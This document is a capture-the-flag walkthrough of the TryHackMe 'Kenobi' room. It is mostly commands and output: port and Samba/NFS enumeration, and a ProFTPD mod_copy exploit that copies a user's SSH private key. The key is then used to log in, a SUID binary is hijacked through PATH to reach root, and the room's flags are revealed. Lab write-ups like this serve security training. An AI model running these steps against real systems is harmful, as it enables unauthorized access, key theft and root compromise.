06/26/25 

Dragon


# kenobi tryhackme room 

## IP = 10.10.200.231 

### Task 1 
```
Scan the machine with nmap, how many ports are open?

7  


```
using steps 
```
sudo nmap -vv -sV -oN nmap/initial.txt 10.10.200.231

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-25 19:52 EDT
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 19:52
Scanning 10.10.200.231 [4 ports]
Completed Ping Scan at 19:52, 0.34s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:52
Completed Parallel DNS resolution of 1 host. at 19:52, 0.01s elapsed
Initiating SYN Stealth Scan at 19:52
Scanning 10.10.200.231 [1000 ports]
Discovered open port 21/tcp on 10.10.200.231
Discovered open port 22/tcp on 10.10.200.231
Discovered open port 80/tcp on 10.10.200.231
Discovered open port 111/tcp on 10.10.200.231
Discovered open port 139/tcp on 10.10.200.231
Discovered open port 445/tcp on 10.10.200.231
Discovered open port 2049/tcp on 10.10.200.231
Completed SYN Stealth Scan at 19:52, 5.46s elapsed (1000 total ports)
Initiating Service scan at 19:52
Scanning 7 services on 10.10.200.231
Completed Service scan at 19:52, 11.76s elapsed (7 services on 1 host)
NSE: Script scanning 10.10.200.231.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:52
Completed NSE at 19:52, 1.17s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:52
Completed NSE at 19:52, 0.93s elapsed
Nmap scan report for 10.10.200.231
Host is up, received reset ttl 63 (0.30s latency).
Scanned at 2025-06-25 19:52:02 EDT for 19s
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 ProFTPD 1.3.5
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     syn-ack ttl 63 2-4 (RPC #100000)
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs         syn-ack ttl 63 2-4 (RPC #100003)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.99 seconds
           Raw packets sent: 1152 (50.664KB) | Rcvd: 1050 (42.028KB)

```

## Task 2 

Enumerating Samba for shares
```
Using the nmap command above, how many shares have been found?

3
```

```
 sudo nmap -p 445 -Pn  --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.200.231 -oN nmap/smbshares.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-25 19:57 EDT
Nmap scan report for 10.10.200.231
Host is up (0.26s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.200.231\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.200.231\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.200.231\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 41.22 seconds


```


```
Once you're connected, list the files on the share. What is the file can you see?

log.txt

```

```
 smbclient //10.10.200.231/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \>  ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877112 blocks available
smb: \> 





```

```
What port is FTP running on?

21
```


```
What mount can we see?

/var 
```
```
sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.200.231 -oN networkenum.txt
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-25 20:10 EDT
Nmap scan report for 10.10.200.231
Host is up (0.46s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836520.0  6877108.0  22%   16.0T        32000
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 9.72 seconds
```


## Task 3 

Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

```
What is the version?

1.3.5 
```

```
How many exploits are there for the ProFTPd running?

4
```

```
kali㉿kali)-[~/ctfs/thm/kenobi/nmap]
└─$ searchsploit proftpd 1.3.5  
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Executi | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command  | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command  | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                  | linux/remote/36742.txt
------------------------------------------- ---------------------------------
Shellcodes: No Results
                                 
```


We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

```
 nc 10.10.200.231 21 
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.200.231]
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
350 File or directory exists, ready for destination name
250 Copy successful

```


We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory

Lets mount the /var/tmp directory to our machine

```
step 1: 
sudo mkdir -p /mnt/kenobiNFS
```
```
step 2:
sudo mount 10.10.200.231:/var /mnt/kenobiNFS
```
```
step 3:
ls -la /mnt/kenobiNFS/tmp

total 28
drwxrwxrwt  6 root root 4096 Jun 25 20:24 .
drwxr-xr-x 14 root root 4096 Sep  4  2019 ..
-rw-r--r--  1 kali kali 1675 Jun 25 20:24 id_rsa
drwx------  3 root root 4096 Jun 25 19:47 systemd-private-0a483cc84bc745da9da00a52dce20b3b-systemd-timesyncd.service-jQJMU7
drwx------  3 root root 4096 Sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
drwx------  3 root root 4096 Sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
drwx------  3 root root 4096 Sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn


```
We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.
```
step 4:
cp /mnt/kenobiNFS/tmp/id_rsa ~/kenobi_id_rsa
```
```
step 5:

chmod 600 ~/kenobi_id_rsa

```

```
 step 6: 
 
 ssh -i ~/kenobi_id_rsa kenobi@10.10.200.231

 The authenticity of host '10.10.200.231 (10.10.200.231)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.200.231' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt


```

```
What is Kenobi's user flag (/home/kenobi/user.txt)?

d0b0f3f53b6caa532a83915e19224899

```

```
cat user.txt 
d0b0f3f53b6caa532a83915e19224899

```

## Task 4 

Privilege Escalation with Path Variable Manipulation

```
What file looks particularly out of the ordinary?

/usr/bin/menu

```

steps 
```
find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6

```

```
Run the binary, how many options appear?

3 

```


steps
```
/usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :


```




```
kenobi@kenobi:~$ echo /bin/sh > /tmp/curl
kenobi@kenobi:~$ chmod +x /tmp/curl
kenobi@kenobi:~$ export PATH=/tmp:$PATH
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# 


```

cat root.txt  
177b3cd8562289f37382721c28381f02
```
What is the root flag (/root/root.txt)?

177b3cd8562289f37382721c28381f02
```